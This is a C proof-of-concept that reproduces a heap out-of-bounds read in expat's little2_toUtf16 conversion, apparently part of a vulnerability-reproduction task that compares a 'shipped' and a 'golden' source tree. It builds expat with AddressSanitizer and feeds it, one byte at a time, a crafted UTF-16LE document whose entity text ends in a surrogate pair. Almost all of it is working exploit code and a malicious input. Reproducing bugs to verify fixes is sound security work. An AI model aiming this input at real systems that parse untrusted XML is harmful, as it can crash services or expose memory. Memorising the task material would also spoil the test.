/*
 * PoC for CVE-2026-72522 (out-of-bounds read in *_toUtf16), residual defect.
 *
 * Drives expat's public API (XML_Parse) with one byte per call, i.e. the
 * documented streaming usage.  The document is a well-formed UTF-16LE XML
 * file whose internal entity `e' has a replacement text of 1023 'a'
 * characters followed by one surrogate pair (U+1F600).  The entity is
 * referenced from an attribute value, so the entity text is converted by
 * little2_toUtf16() with a nearly full output pool; the last unit of the
 * entity text is the LOW surrogate of the pair and is still treated like a
 * high surrogate by the shipped conversion check, which desynchronises the
 * entity value pool bookkeeping and makes little2_toUtf16() read past the
 * end of the pool block.
 *
 * Expected on the shipped tree:  AddressSanitizer heap-buffer-overflow READ
 *                                in little2_toUtf16 (aborts, exit 1)
 * Expected on the golden tree:   runs to completion, exit 0
 *
 * Build/run (from the repository root, needs a 16bit XML_Char build):
 *   cmake -S expat -B /tmp/poc-build -DEXPAT_CHAR_TYPE=ushort \
 *     -DEXPAT_BUILD_TESTS=OFF -DEXPAT_BUILD_EXAMPLES=OFF \
 *     -DEXPAT_BUILD_TOOLS=OFF -DEXPAT_SHARED_LIBS=OFF \
 *     -DCMAKE_C_COMPILER=gcc \
 *     -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1"
 *   cmake --build /tmp/poc-build
 *   gcc -DXML_UNICODE=1 -I expat/lib -fsanitize=address \
 *     -fno-omit-frame-pointer -g -O1 pocs/residual.c \
 *     /tmp/poc-build/libexpatw.a -o /tmp/poc-residual
 *   /tmp/poc-residual
 */
#include <stdio.h>
#include <string.h>

#define XML_UNICODE 1
#include "expat.h"

static enum XML_Status
feed_single_bytes(XML_Parser parser, const char *s, int len, int isFinal) {
  for (int i = 0; i < len; i++) {
    enum XML_Status res
        = XML_Parse(parser, s + i, 1, (isFinal && i + 1 == len) ? 1 : 0);
    if (res != XML_STATUS_OK) {
      fprintf(stderr, "XML_Parse returned %d at byte %d/%d (error %d: %s)\n",
              res, i, len, XML_GetErrorCode(parser),
              XML_ErrorString(XML_GetErrorCode(parser)));
      return res;
    }
  }
  return XML_STATUS_OK;
}

int
main(void) {
  // "<!DOCTYPE d [\n  <!ENTITY e '" (UTF-16LE, without BOM)
  const char doc_before[]
      = "<\0!\0D\0O\0C\0T\0Y\0P\0E\0 \0d\0 \0[\0\n\0"
        " \0 \0<\0!\0E\0N\0T\0I\0T\0Y\0 \0e\0 \0'\0";
  // "'>\n]>\n<r a='&e;'/>\n" (UTF-16LE)
  const char doc_after[] = "'\0>\0\n\0]\0>\0\n\0"
                           "<\0r\0 \0a\0=\0'\0&\0e\0;\0'\0/\0>\0\n\0";

  // 1021..1025 covers the pool block geometry; the read past the pool block
  // happens for the geometry at 1023 padding characters.
  for (size_t i = 1021; i <= 1025; i++) {
    fprintf(stderr, "--- padding %zu ---\n", i);
    XML_Parser parser = XML_ParserCreate(NULL);
    if (parser == NULL)
      return 2;

    if (feed_single_bytes(parser, doc_before, (int)sizeof(doc_before) - 1, 0)
        != XML_STATUS_OK)
      return 3;

    for (size_t j = 0; j < i; j++) {
      if (feed_single_bytes(parser, "a\0", 2, 0) != XML_STATUS_OK)
        return 4;
    }

    // U+1F600 as UTF-16LE surrogate pair: U+D83D U+DE00
    if (feed_single_bytes(parser, "\x3d\xd8\x00\xde", 4, 0) != XML_STATUS_OK)
      return 5;

    if (feed_single_bytes(parser, doc_after, (int)sizeof(doc_after) - 1, 1)
        != XML_STATUS_OK)
      return 6;

    XML_ParserFree(parser);
  }
  fprintf(stderr, "completed without abort\n");
  return 0;
}
